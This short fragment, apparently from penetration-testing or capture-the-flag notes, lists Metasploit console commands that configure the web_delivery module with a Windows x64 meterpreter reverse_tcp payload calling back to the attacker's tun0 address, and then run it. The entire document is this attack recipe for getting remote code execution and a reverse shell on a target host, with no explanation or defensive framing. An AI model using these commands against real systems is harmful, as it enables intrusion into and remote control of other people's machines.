
##### Encoded

```
msfconsole
use exploit/multi/script/web_delivery
set RHOSTS <ip>
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set target 2
run
```